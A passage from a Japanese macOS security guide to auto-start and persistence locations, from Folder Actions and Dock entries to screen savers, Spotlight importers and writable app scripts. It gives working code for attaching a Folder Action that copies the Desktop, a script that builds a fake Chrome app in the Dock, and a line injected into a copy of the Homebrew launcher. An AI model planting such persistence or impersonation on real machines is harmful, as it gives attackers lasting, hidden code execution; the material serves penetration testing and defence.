-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

ファイル名には queue、job 番号、実行予定時刻が含まれます。例として `a0001a019bdcd2` を見てみましょう。

- `a` - queue です
- `0001a` - 16 進数で表された job 番号です。`0x1a = 26`
- `019bdcd2` - 16 進数で表された時刻です。epoch からの経過分数を示します。`0x019bdcd2` は 10 進数で `26991826` です。これに 60 を掛けると `1619509560` となり、これは `GMT: 2021. April 27., Tuesday 7:46:00` です。

job ファイルを出力すると、`at -c` で確認したものと同じ情報が含まれていることがわかります。

### Calendar の「ファイルを開く」アラート

- **書き込み対象:** Calendar イベントのカスタム **「ファイルを開く」** アラートですでに選択されている実行可能なアプリバンドル、または別のファイル。アラート自体を作成・編集するには、Calendar または許可されたカレンダーデータソースを通じて、その Calendar イベントにアクセスする必要があります。無関係なファイルへの書き込みではアラートは作成されません。
- **トリガー:** Calendar がイベントを処理する Mac で、アラートに設定された時刻に実行されます。繰り返しイベントでは、アクションも繰り返される場合があります。[Apple の現行 Calendar ガイド](https://support.apple.com/guide/calendar/icl1012/mac)では、macOS 26 の **「カスタム → ファイルを開く」** アラートオプションが確認できます。
- **実行時の ID と制限:** Calendar は、サインイン中のユーザーとして、関連付けられたアプリケーションで選択したファイルを開きます。アプリバンドルを起動すると、そのコードがユーザーとして実行される可能性がありますが、Gatekeeper、quarantine、その他の macOS のチェックが適用されます。通常のスクリプトファイルはエディタで開くだけの場合があり、拡張子だけではコードが実行されるとは限りません。

候補を安全に評価するには、Calendar でイベントのアラートと、選択されたファイルの権限を確認します。この方法は Apple のガイドをもとに記載したものであり、実際のカレンダーを変更してデスクトップイベントを待つ必要があるため、調査用 Mac では実行していません。使い捨てアカウントで、マーカーのみを記録するアプリバンドルを選択し、近い将来の「ファイルを開く」アラートを設定して起動を確認した後、イベントとアプリを削除できます。

### macOS の Shortcuts オートメーション

- **書き込み対象:** ショートカットのアクションからすでに参照されている実行可能ファイル、または許可されたユーザーが編集できる既存のショートカットです。無関係な `.shortcut` ファイルや、文書化されていない Shortcuts データベースへの書き込みは、サポートされているオートメーション登録方法ではありません。
- **トリガーと実行時の ID:** 時刻やアプリのイベントなど、事前に設定され有効化されたオートメーションイベントによって、サインイン中のユーザーとしてショートカットが実行されます。[Apple の現行 Mac オートメーションガイド](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac)には、サポートされているイベント、「実行前に尋ねる」ことなくオートメーションを実行できる条件、およびトリガーの削除方法が記載されています。[Apple の Shortcuts プライバシーガイド](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac)によると、スクリプトアクションには **「スクリプトの実行を許可」** が必要であり、個々のアクションで追加の許可を求められる場合もあります。

これは、既存のアクションが書き込み可能な対象を読み込む場合に限り、書き込みから実行につながる可能性がある経路です。新しいオートメーションを UI から作成すると実際の設定が変更されるため、調査用 Mac では試していません。使い捨てアカウントで、所有者が時刻指定のショートカットを設定し、スクリプトで `/tmp/ht-shortcuts-marker` にアクセスするようにできます。必要な権限を有効にし、イベント後にマーカーを確認したら、オートメーション、ショートカット、マーカーを削除します。

### Automator アクションと Quick Actions

- **書き込み対象:** アクションバンドル用の `~/Library/Automator/*.action`（ユーザー）および `/Library/Automator/*.action`（管理者）。保存された Quick Action ワークフローは通常 `~/Library/Services/*.workflow` にあります。ユーザーが選択した実際のワークフローパスを確認してください。[Apple の Automator framework リファレンス](https://developer.apple.com/documentation/automator)には、アクションの検索ディレクトリが記載されています。
- **トリガー:** Automator は実行時に利用可能なアクションバンドルを読み込みますが、アクションのタスクはそれを使用するワークフローが実行されたときに動きます。Quick Action は、ユーザーが Finder、Services、または表示されている別のメニューから選択すると実行されます。Folder Action ワークフローは、**すでに関連付けられている**フォルダに項目が追加されたときに実行され、Calendar Alarm ワークフローはイベント時刻に実行されます。[Apple のワークフローの種類](https://support.apple.com/guide/automator/aut7cac58839/mac)では、これらのイベントが区別されています。アクションやワークフローを書き込むだけでは、フォルダとの関連付けやカレンダーイベントのスケジュールは行われません。
- **実行時の ID と制限:** ワークフローを実行するアカウントです。Automator または呼び出し元のアプリがアクションを読み込める必要があり、現在のコード署名やプライバシーチェックを通過しなければなりません。有効なワークフローがすでに参照している書き込み可能なアクションバンドルと、新しいアクションをインストールして選択されるのを待つケースは異なります。

macOS 26.5.2 のテスト用 Mac には、ユーザーの `Automator` ディレクトリと `Services` ディレクトリが存在し、`/Library/Automator` はありませんでした。実際のワークフローの作成、関連付け、実行は行っていません。特定の読み込み経路を確認するには、使い捨てアカウントと、マーカーのみを記録するアクション／ワークフローを使用してください。イベントソースについて詳しくは、別項の [Folder Actions](#folder-actions) を参照してください。

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- sandbox のバイパスに有用: [✅](https://emojipedia.org/check-mark-button)
  - ただし、Folder Actions を設定するには、引数付きで `osascript` を呼び出し、**`System Events`** にアクセスできる必要があります。
- TCC バイパス: [🟠](https://emojipedia.org/large-orange-circle)
  - Desktop、Documents、Downloads などの基本的な TCC 権限があります。

#### 場所

- **`/Library/Scripts/Folder Action Scripts`**
  - root 権限が必要
  - **トリガー**: 指定したフォルダへのアクセス
- **`~/Library/Scripts/Folder Action Scripts`**
  - **トリガー**: 指定したフォルダへのアクセス

#### 説明と悪用

Folder Actions は、項目の追加や削除、フォルダウィンドウを開く、サイズを変更するといったフォルダ内の変化によって自動的にトリガーされるスクリプトです。Finder UI やターミナルコマンドなど、さまざまな方法でトリガーでき、幅広いタスクに利用できます。<sup>[[17]](#references)[[18]](#references)</sup>

Folder Actions を設定する方法はいくつかあります。

1. [Automator](https://support.apple.com/guide/automator/welcome/mac) で Folder Action ワークフローを作成し、サービスとしてインストールする。
2. フォルダのコンテキストメニューにある Folder Actions Setup から、スクリプトを手動で関連付ける。
3. OSAScript を使って `System Events.app` に Apple Event メッセージを送り、プログラムから Folder Action を設定する。
   - この方法は、アクションをシステムに組み込んで、永続性を確保するのに特に有用です。

Folder Action で実行できるスクリプトの例を以下に示します。

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

上記のスクリプトをFolder Actionsで使用できるようにするには、次のようにコンパイルします:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

スクリプトをコンパイルしたら、以下のスクリプトを実行してFolder Actionsを設定します。このスクリプトはFolder Actionsをシステム全体で有効にし、先ほどコンパイルしたスクリプトをDesktopフォルダに関連付けます。

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

次のコマンドでセットアップスクリプトを実行します:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- GUIを使ってこの永続化を実装する方法は次のとおりです。

これは実行されるスクリプトです。

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

JavaScriptでコンパイルします: `osacompile -l JavaScript -o folder.scpt source.js`

次の場所に移動します:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

次に、`Folder Actions Setup` アプリを開き、**監視したいフォルダー**を選択して、この例では **`folder.scpt`** を選択します（私の場合は output2.scp という名前にしました）:

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

これで、**Finder** でそのフォルダーを開くと、スクリプトが実行されます。

この設定は、base64形式で **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** にある **plist** に保存されていました。

では、GUIにアクセスせずにこの永続化を設定してみましょう。

1. **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** を `/tmp` にコピーしてバックアップします:
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. 先ほど設定したFolder Actionsを**削除**します:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

これで環境が空になったので、

3. バックアップファイルをコピーします: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Folder Actions Setup.app を開き、この設定を読み込ませます: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> 私の場合はうまくいきませんでしたが、writeupに記載されていた手順は以上です:(

### Dockショートカット

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- sandboxのバイパスに有効: [✅](https://emojipedia.org/check-mark-button)
  - ただし、悪意のあるアプリケーションをシステム内にインストールしておく必要があります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- `~/Library/Preferences/com.apple.dock.plist`
  - **トリガー**: ユーザーがDock内のアプリをクリックしたとき

#### 説明と悪用

Dockに表示されるすべてのアプリケーションは、plist **`~/Library/Preferences/com.apple.dock.plist`** に指定されています<sup>[[19]](#references)</sup>

次のようにするだけで、**アプリケーションを追加**できます:

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

多少の**social engineering**を使えば、dock内で**たとえばGoogle Chromeになりすまし**、実際に独自のスクリプトを実行できます。

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### 入力メソッド

- **書き込み先:** `~/Library/Input Methods/`（ユーザー）または `/Library/Input Methods/`（管理者）にインストールされた、コードを含む入力メソッドアプリのバンドル。これは、単独では任意のコードを実行するペイロードにならない、Appleのプレーンテキスト形式の `.inputplugin` キーボードマッピングファイルとは異なります。
- **トリガー:** ユーザーが **システム設定 → キーボード → テキスト入力** で入力ソースを追加・有効化し、その後に選択または使用します。ディレクトリにコピーされただけのバンドルは、macOSが起動する証拠にはなりません。[Appleの現行の入力ソースガイド](https://support.apple.com/guide/mac-help/mchl84525d76/mac)では入力ソースの有効化と切り替えについて説明されており、[AppleのInputMethodKitドキュメント](https://developer.apple.com/documentation/inputmethodkit)ではコードを含む入力メソッドについて説明されています。
- **実行時のIDと制約:** メソッドはサインイン中のユーザーとして実行され、入力メソッドの登録、コード署名、現行のmacOSセキュリティチェックの対象となります。既存の有効なメソッドで実行ファイルに書き込み可能なものについては、別途、実行経路と署名を確認する必要があります。

Appleの[以前のサードパーティ製入力メソッドに関する注意事項](https://developer.apple.com/library/archive/qa/qa1810/_index.html)では、特定のパレットメソッドをこれらのディレクトリにコピーしても、入力ソースに表示すらされないとすでに警告されていました。macOS 26.5.2の調査用Macではユーザーディレクトリは存在しますが、バンドルはインストールも有効化もされていませんでした。そのため、これはローカルでの実行結果ではなく、条件付きの経路として記載しています。

### カラーピッカー

解説記事: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Sandboxのバイパスに有用: [🟠](https://emojipedia.org/large-orange-circle)
  - 非常に特定の操作が必要
  - 別のSandboxに入る
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- `/Library/ColorPickers`
  - Root権限が必要
  - トリガー: カラーピッカーを使用する
- `~/Library/ColorPickers`
  - トリガー: カラーピッカーを使用する

#### 説明とExploit

コードを含む**カラーピッカー**バンドルをコンパイルし（例として[**こちら**](https://github.com/viktorstrate/color-picker-plus)を使用できます）、[スクリーンセーバーのセクション](macos-auto-start-locations.md#screen-saver)のようにconstructorを追加して、バンドルを `~/Library/ColorPickers` にコピーします。<sup>[[20]](#references)</sup>

その後、カラーピッカーが起動されると、バンドルも実行されるはずです。

この動作は、互換性のあるアプリがシステムのカラーパネルを開き、インストール済みのピッカーを選択することが条件です。[Appleのカラーパネルガイド](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html)では、従来のバンドルの場所について説明されています。ローカルでパスを確認したところ、従来のカラーピッカーXPCサービスは存在しましたが、調査用Macにはピッカーがインストールも読み込みもされていませんでした。パスだけからTCC bypassを推測しないでください。

ライブラリを読み込むバイナリには**非常に制限の厳しいSandbox**がある点に注意してください: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Finder Sync Plugins

**解説**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**解説**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- sandboxのbypassに有用: **いいえ。自分のアプリを実行する必要があるため**
- TCC bypass: 有効なextensionのsandboxと権限によります。一般的なbypassは確認されていません。

#### 場所

- 特定のアプリ

#### 説明とExploit

Finder Sync Extensionを使用するアプリの例は[**こちら**](https://github.com/D00MFist/InSync)で確認できます。

アプリには`Finder Sync Extensions`を含めることができます。このextensionは、実行されるアプリ内に配置されます。さらに、extensionがコードを実行するには、有効なApple developer certificateで**署名**され、**sandbox化**されている必要があります（ただし、緩和する例外を追加できる場合があります）。また、次のような方法で登録する必要があります:<sup>[[21]](#references)[[22]](#references)</sup>

インストールされたextensionは、関連するFinderの場所または項目に対して**有効化**され、呼び出される必要もあります。任意の`.appex` bundleを書き込むだけでは不十分です。[AppleのFinder Sync API](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled)で有効状態を確認できます。以下の`pluginkit`コマンドは、明示的な登録と有効化の例であり、ファイルだけで自動起動する方法ではありません。この方法はドキュメントを確認して評価しました。調査用Macに新しいextensionをインストールまたは有効化してはいません。

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### スクリーンセーバー

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- sandbox の bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
  - ただし、一般的なアプリケーションの sandbox 内で実行されます
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- `/System/Library/Screen Savers`
  - root 権限が必要
  - **トリガー**: スクリーンセーバーを選択
- `/Library/Screen Savers`
  - root 権限が必要
  - **トリガー**: スクリーンセーバーを選択
- `~/Library/Screen Savers`
  - **トリガー**: スクリーンセーバーを選択

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### 説明と Exploit

Xcode で新しいプロジェクトを作成し、新しい **Screen Saver** を生成するテンプレートを選択します。次に、コードを追加します。たとえば、ログを生成する次のコードを追加します。<sup>[[23]](#references)[[24]](#references)</sup>

**ビルド**し、`.saver` バンドルを **`~/Library/Screen Savers`** にコピーします。次に、スクリーンセーバーの GUI を開いてクリックするだけで、大量のログが生成されるはずです。

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> このコードを読み込むバイナリ（`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`）のentitlementsに **`com.apple.security.app-sandbox`** が含まれているため、**一般的なアプリケーションサンドボックス内にいる**ことに注意してください。

スクリーンセーバーのコード:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Spotlightプラグイン

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- sandbox bypassに有用: [🟠](https://emojipedia.org/large-orange-circle)
  - ただし、最終的にはアプリケーションのsandbox内で実行されます
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - sandboxは非常に制限されているようです

#### 場所

- `~/Library/Spotlight/`
  - **トリガー**: Spotlightプラグインが管理する拡張子の新しいファイルが作成される
- `/Library/Spotlight/`
  - **トリガー**: Spotlightプラグインが管理する拡張子の新しいファイルが作成される
  - root権限が必要
- `/System/Library/Spotlight/`
  - **トリガー**: Spotlightプラグインが管理する拡張子の新しいファイルが作成される
  - root権限が必要
- `Some.app/Contents/Library/Spotlight/`
  - **トリガー**: Spotlightプラグインが管理する拡張子の新しいファイルが作成される
  - 新しいアプリが必要

#### 説明と悪用

SpotlightはmacOSに組み込まれた検索機能で、ユーザーがコンピューター上のデータに**すばやく包括的にアクセスできるように設計されています**。\
この高速な検索機能を実現するため、Spotlightは**独自のデータベース**を保持し、**ほとんどのファイルを解析**してインデックスを作成することで、ファイル名とファイルの内容の両方をすばやく検索できるようにします。<sup>[[25]](#references)</sup>

Spotlightの基盤となる仕組みは、「mds」という中央プロセスで動作します。これは**「metadata server（メタデータサーバー）」**を意味します。このプロセスがSpotlightサービス全体を統括します。これを補完する複数の「mdworker」デーモンが、さまざまなファイル形式のインデックス作成など、さまざまなメンテナンスタスクを実行します（`ps -ef | grep mdworker`）。これらのタスクは、Spotlight importerプラグイン、つまり**「.mdimporterバンドル**」によって可能になります。このバンドルにより、Spotlightは多様なファイル形式の内容を認識してインデックス化できます。

プラグイン、つまり**`.mdimporter`**バンドルは、前述の場所にあります。新しいバンドルが検出され、ファイル形式に一致し、Spotlightが実際に一致するファイルをインデックス化する必要があります。バンドルをコピーしただけでは、読み込まれたことの証明にはなりません。[AppleのMDImporterリファレンス](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter)では、読み込みは対象となるファイルの変更に関連付けられています。macOS 26でのSpotlight importerの実行は、ここではテストしていません。

次のコマンドを実行すると、読み込まれているすべての`mdimporters`を**確認できます**。

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

また、たとえば **/Library/Spotlight/iBooksAuthor.mdimporter** は、これらの種類のファイル（拡張子 `.iba`、`.book` など）の解析に使用されます。

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> 他の `mdimporter` の Plist を確認しても、**`UTTypeConformsTo`** エントリが見つからないことがあります。これは組み込みの _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) であり、拡張子を指定する必要がないためです。
>
> さらに、システムのデフォルトプラグインが常に優先されるため、攻撃者がアクセスできるのは、Apple 独自の `mdimporter` によってインデックスされないファイルに限られます。

独自の importer を作成するには、このプロジェクト [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) をベースにし、名前と **`CFBundleDocumentTypes`** を変更して、対応させたい拡張子をサポートする **`UTImportedTypeDeclarations`** を追加し、それらを **`schema.xml`** に反映します。\
次に、処理対象の拡張子を持つファイルが作成されたときに payload を実行するよう、関数 **`GetMetadataForFile`** のコードを**変更**します。

最後に、新しい **`.mdimporter` をビルドして、先に挙げた3つの場所のいずれかにコピー**します。**ログを監視**するか、**`mdimport -L`** を実行すると、読み込まれたか確認できます。

> [!TIP]
> importer の sandbox は非常に制限的ですが、`mdworker` は**特権付きの読み取りアクセス**でファイルをインデックスします。そのため、悪意のある `.mdimporter` は TCC で保護された場所（Downloads、Pictures、Desktop など）にあるファイルの*内容*を読み取り、TCC プロンプトなしで収集したメタデータを外部に送信できます。これは **「Sploitlight」TCC bypass（CVE-2025-31199）**であり、macOS Sequoia 15.4 で修正されました。<sup>[[55]](#references)</sup>

### ~~環境設定パネル~~

> [!CAUTION]
> これはもう機能しないようです。

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- sandbox bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
  - 特定のユーザー操作が必要です
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### 説明

これはもう機能しないようです。<sup>[[26]](#references)</sup>

### アプリケーションスクリプトファイル

Writeup: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- sandbox bypass に有用: [✅](https://emojipedia.org/check-mark-button)
  - ただし、標的のアプリケーションがインストールされており、被害者が実行または使用する必要があります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

インストール済みのアプリケーションまたはツールが実際に実行し、攻撃者が変更できる**インタープリター型スクリプト**です。ファイルの権限と呼び出し元のパスを確認してください。`.sh` や `.py` ファイルが見つかっただけでは不十分です。Apple の [code-signing guide](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html) によると、署名済みアプリバンドルはスクリプトを含むリソースを封印します。バンドル内のスクリプトを編集するとその封印が破られ、バンドルの検証時に検出またはブロックされる可能性があります。Homebrew の launcher のような外部スクリプトは、署名と信頼の扱いが異なります。Writeup に記載された過去の例は次のとおりです。

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** – 以前の Sublime Text リリースで使われていたスクリプトです。インストール済みバージョンで、ファイルの存在と起動時の使用状況を確認してください。テスト用 Mac にはありませんでした。
- **`/opt/homebrew/bin/brew`**（Apple Silicon）または **`/usr/local/bin/brew`**（Intel）– インストール済みで攻撃者が書き込み可能な場合、その `brew` パスが呼び出されると実行される Bash launcher です。テスト用 Mac では `/opt/homebrew/bin/brew` は書き込み可能な Bash スクリプトでした。これはローカルでの観測であり、Homebrew 全般に当てはまる権限ルールではありません。
- **Python アプリバンドル内の IDLE の `idlemain.py`** – 書き込みに admin 権限が必要な場合がありますが、IDLE ユーザーの identity で実行されます。
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** – 対応する `org.wireshark.ChmodBPF` launchd job がインストールされている場合に、root で実行される過去のシェルスクリプトです。テスト用 Mac にはスクリプトも job もありませんでした。

#### 説明と悪用

一部のツールやアプリは、実行時にインタープリター型スクリプトを実行します。書き込み可能なスクリプトは、署名の検証、quarantine、その他のチェックで阻止されなければ、次回その呼び出し元が実行されたときに追加したコマンドを実行できます。元の調査では、2019年時点の複数のインストール例が示されていました。標的のバージョンでパスと実行条件を再確認してください。<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

このコピーのテストでは、macOS 26.5.2で `marker fired: True` が出力されました。元のランチャーには手を加えていません。これは、挿入ポイントがコピー内で実行されることを示すものであり、変更された署名済みアプリバンドルや実際のHomebrewインストールがすべての起動チェックを通過することを示すものではありません。

### Dock Tile Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- sandboxのバイパスに有用: [✅](https://emojipedia.org/check-mark-button)
  - プラグインを宣言するアプリがDockによって検出・登録され、処理される必要がある
  - プラグインは、app-sandbox entitlementを持たず、**library validationが無効**になっている**Apple署名済み**のhelperに読み込まれる。引用した調査では、このhelperはBackground Task Management UIに表示されていなかった。対象のmacOSリリースで表示されるかは確認が必要。
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**。アプリの`Info.plist`にある**`NSDockTilePlugIn`**キーで参照し、プラグイン自身の`Info.plist`で**`NSPrincipalClass`**を設定する。

#### Description & Exploitation

